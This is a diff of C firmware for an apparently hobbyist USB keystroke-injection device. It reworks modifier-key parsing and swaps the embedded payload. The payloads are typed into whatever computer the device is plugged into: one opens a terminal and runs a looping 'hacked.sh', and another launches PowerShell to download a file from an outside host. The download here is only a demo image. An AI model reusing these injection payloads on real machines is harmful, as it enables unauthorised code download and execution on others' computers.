@@ -72,16 +72,28 @@
  * The string to send by the Keyboard.
  * @see parse_command_lines(char *str) for documentation
  */
-char *str = "K: ALT F2\n\
+//char *str = "K: ALT F2\n\
 W 500\n\
 S konsole\n\
 E\n\
-W 500\n\
+W 1000\n\
 S echo '#!/bin/sh'>hacked.sh\n\
 E\n\
 S echo 'while :; do echo \"Hacked or so :))\";done'>>hacked.sh\n\
 E\n\
 S sh hacked.sh &\n\
+E\0";
+
+//char *str = "K ALT CTRL DEL\n\
+W 500\n\
+K ALT R\0";
+
+char *str = "K WIN R\n\
+W 500\n\
+S PowerShell\n\
+E\n\
+W 1000\n\
+S (New-Object System.Net.WebClient).DownloadFile(\"http://ranta.ch/P1000269_small.JPG\", \"C:\\%USERPROFILE%\\hacked.jpg\"\n\
 E\0";
 
 /**
@@ -141,8 +153,9 @@ void parse_char(char *str);
  *   Ctrl, Alt, Win, Shift, Del, Home, Insert, ENd, EScape, Sysrq, Return, Tab
  * 
  * @param *str Pointer to the CharArray to send
+ * @param modifier The current Modifier key to apply all others to
  */
-void parse_special(char *str);
+void parse_special(char *str, int *modifier);
 
 
 /**
@@ -184,7 +197,7 @@ int main(void) {
  */
 void parse_command_lines(char *str) {
 	char *send = str, chr;
-	int cmd = *(send++), len = 1, timeout = 0, current_key_pos = 0;
+	int cmd = *(send++), timeout = 0, current_key_pos = 0, current_modifier = 0;;
 #ifdef CONSOLE_DEBUG
 	// This is defined in usb_keyboard.c (as an array of int) which we not include in CONSOLE_DEBUG mode
 	char keyboard_keys[6] = { 0, 0, 0, 0, 0, 0 };
@@ -193,14 +206,12 @@ void parse_command_lines(char *str) {
 	// Skip the ":" after the command
 	if (*send == ':') {
 		send++;
-		len++;
 	}
 	
 	// Skip all whitespaces if there are some
 	if (*send == ' ') {
 		while (*send == ' ') {
 			send++;
-			len++;
 		}
 	}
 	
@@ -226,6 +237,28 @@ void parse_command_lines(char *str) {
 			keyboard_keys[4] = 0;
 			keyboard_keys[5] = 0;
 			
+			// Get the main Modifier, all others are applied by an &
+			switch (*send) {
+				case 'W':
+				case 'w':
+					current_modifier = KEY_GUI;
+					break;
+				case 'S':
+				case 's':
+					current_modifier = KEY_SHIFT;
+					break;
+				case 'C':
+				case 'c':
+					current_modifier = KEY_CTRL;
+					break;
+				case 'A':
+				case 'a':
+					current_modifier = KEY_ALT;
+					break;
+				default:
+					current_modifier = KEY_NONE;
+			}
+
 			while (1) {
 				chr = *(send++);
 				if (chr == '\0') break;
@@ -258,11 +291,10 @@ void parse_command_lines(char *str) {
 						
 					// Special command key made of at least 2 chars
 					} else if (*(send + 1) > 32) {
-						parse_special(send++);
+						parse_special(send++, &current_modifier);
 #ifdef CONSOLE_DEBUG
 						debug_char = *(send - 1);
 						printf(" +%s", &debug_char);
-						printf(" (%d)", press_key);
 #endif
 						
 					// Any other key
@@ -286,34 +318,12 @@ void parse_command_lines(char *str) {
 					send++;
 				}
 			}
-			
-			// Send the Keystroke with the initial Modifier-Key
-			switch (str[len]) {
-				case 'W':
-				case 'w':
-					press_modifier = KEY_GUI;
-					break;
-				case 'S':
-				case 's':
-					press_modifier = KEY_SHIFT;
-					break;
-				case 'C':
-				case 'c':
-					press_modifier = KEY_CTRL;
-					break;
-				case 'A':
-				case 'a':
-					press_modifier = KEY_ALT;
-					break;
-				default:
-					press_modifier = KEY_NONE;
-			}
 #ifdef CONSOLE_DEBUG
 			printf("\n");
 #else
 			// The same way usb_keyboard_press() is doing but not with one key but with all we where reading out before
 			int8_t r;
-			keyboard_modifier_keys = press_modifier;
+			keyboard_modifier_keys = current_modifier;
 			r = usb_keyboard_send();
 			if (!r) {
 				keyboard_modifier_keys = 0;
@@ -728,11 +738,12 @@ void parse_char(char *str) {
 /**
  * Implementation of parse_special(char *str)
  */
-void parse_special(char *str) {
+void parse_special(char *str, int *modifier) {
 	switch (*str) {
 		case 'A':
 		case 'a':
-			press_key = SKEY_ALT;
+			press_key = KEY_NONE;
+			*modifier = *modifier | KEY_ALT;
 			break;
 		case 'D':
 		case 'd':
@@ -740,7 +751,8 @@ void parse_special(char *str) {
 			break;
 		case 'C':
 		case 'c':
-			press_key = SKEY_CTRL;
+			press_key = KEY_NONE;
+			*modifier = *modifier | KEY_CTRL;
 			break;
 		case 'E':
 		case 'e':
@@ -769,7 +781,8 @@ void parse_special(char *str) {
 			break;
 		case 'S':
 		case 's':
-			press_key = SKEY_SHIFT;
+			press_key = KEY_NONE;
+			*modifier = *modifier | KEY_SHIFT;
 			break;
 		case 'W':
 		case 'w':
